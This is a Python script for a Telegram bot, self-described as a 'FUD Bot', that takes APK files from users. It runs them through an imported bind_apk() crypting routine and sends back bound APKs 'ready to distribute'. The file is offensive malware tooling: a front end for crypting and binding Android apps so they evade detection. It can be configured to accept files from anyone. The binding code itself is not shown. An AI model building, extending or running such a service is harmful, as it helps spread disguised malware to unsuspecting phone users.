#!/usr/bin/env python3
"""
Telegram FUD Bot
────────────────
Drop an APK into the chat → bot crypts it with bind_apk() → sends back
the bound APK ready to distribute.

Setup
─────
1. Add to .env:
       TELEGRAM_BOT_TOKEN=123456789:AAF...
       TELEGRAM_CHAT_ID=your_numeric_chat_id   # whitelist; leave blank to allow all

2. Run:
       python bot.py

3. Send any .apk file to your bot on Telegram.
   The bot replies with the crypted APK.
"""

import os
import sys
import time
import tempfile
import traceback
import requests

# ── Load .env ────────────────────────────────────────────────────────────────
try:
    from dotenv import load_dotenv
    load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env'))
except ImportError:
    pass

BOT_TOKEN   = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
ALLOWED_ID  = os.environ.get('TELEGRAM_CHAT_ID', '').strip()   # '' = allow all

if not BOT_TOKEN:
    print("[FAIL] TELEGRAM_BOT_TOKEN not set in .env")
    sys.exit(1)

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
FILE_API = f"https://api.telegram.org/file/bot{BOT_TOKEN}"

# ── Import bind_apk from fud.py (same directory) ─────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from fud import bind_apk


# ── Telegram helpers ──────────────────────────────────────────────────────────

def tg(method, **kwargs):
    """Call a Telegram Bot API method; return the parsed JSON result."""
    r = requests.post(f"{API}/{method}", json=kwargs, timeout=30)
    return r.json()


def send(chat_id, text, **kwargs):
    return tg("sendMessage", chat_id=chat_id, text=text, **kwargs)


def send_doc(chat_id, file_path, caption=""):
    with open(file_path, "rb") as f:
        requests.post(
            f"{API}/sendDocument",
            data={"chat_id": chat_id, "caption": caption},
            files={"document": (os.path.basename(file_path), f, "application/octet-stream")},
            timeout=120,
        )


def download_file(file_id, dest_path):
    """Download a Telegram file by file_id to dest_path."""
    info = tg("getFile", file_id=file_id)
    if not info.get("ok"):
        raise RuntimeError(f"getFile failed: {info}")
    file_path = info["result"]["file_path"]
    url = f"{FILE_API}/{file_path}"
    r = requests.get(url, timeout=120, stream=True)
    r.raise_for_status()
    with open(dest_path, "wb") as f:
        for chunk in r.iter_content(65536):
            f.write(chunk)


# ── Core handler ──────────────────────────────────────────────────────────────

def handle_apk(chat_id, file_id, original_name):
    """Download APK, run bind_apk, send back the crypted file."""
    with tempfile.TemporaryDirectory(prefix="fudbot_") as tmp:
        in_apk  = os.path.join(tmp, original_name)
        out_apk = os.path.join(tmp, "crypted_" + original_name)

        send(chat_id, "⏳ Downloading APK...")
        download_file(file_id, in_apk)

        send(chat_id, "🔐 Crypting — this takes 1–3 minutes...")
        try:
            bind_apk(in_apk, None, out_apk)
        except Exception as e:
            send(chat_id, f"❌ Crypt failed:\n<pre>{str(e)[:800]}</pre>",
                 parse_mode="HTML")
            traceback.print_exc()
            return

        if not os.path.exists(out_apk):
            send(chat_id, "❌ bind_apk finished but output file not found.")
            return

        size_mb = os.path.getsize(out_apk) / 1_048_576
        send(chat_id, f"✅ Done — sending crypted APK ({size_mb:.1f} MB)...")
        send_doc(chat_id, out_apk,
                 caption=f"🔐 crypted_{original_name}\nSize: {size_mb:.1f} MB")


# ── Polling loop ──────────────────────────────────────────────────────────────

def run():
    print(f"[+] Bot started — polling for APKs...")
    if ALLOWED_ID:
        print(f"    Whitelist: chat_id {ALLOWED_ID}")
    else:
        print("    Warning: TELEGRAM_CHAT_ID not set — accepting APKs from anyone")

    offset = None
    while True:
        try:
            params = {"timeout": 30, "allowed_updates": ["message"]}
            if offset is not None:
                params["offset"] = offset

            resp = requests.post(f"{API}/getUpdates",
                                 json=params, timeout=40).json()
            if not resp.get("ok"):
                print(f"getUpdates error: {resp}")
                time.sleep(5)
                continue

            for update in resp.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message", {})
                chat_id = str(msg.get("chat", {}).get("id", ""))

                # Whitelist check
                if ALLOWED_ID and chat_id != ALLOWED_ID:
                    send(chat_id, "⛔ Unauthorized.")
                    continue

                doc = msg.get("document")
                if not doc:
                    # Not a file — show help
                    if msg.get("text"):
                        send(chat_id,
                             "👋 Send me an APK file and I'll crypt it for you.")
                    continue

                fname = doc.get("file_name", "app.apk")
                mime  = doc.get("mime_type", "")

                if not (fname.lower().endswith(".apk") or
                        "android" in mime or "zip" in mime):
                    send(chat_id, "⚠️ Send an APK file (.apk).")
                    continue

                handle_apk(chat_id, doc["file_id"], fname)

        except KeyboardInterrupt:
            print("\n[+] Stopped.")
            break
        except Exception as e:
            print(f"[!] Polling error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    run()
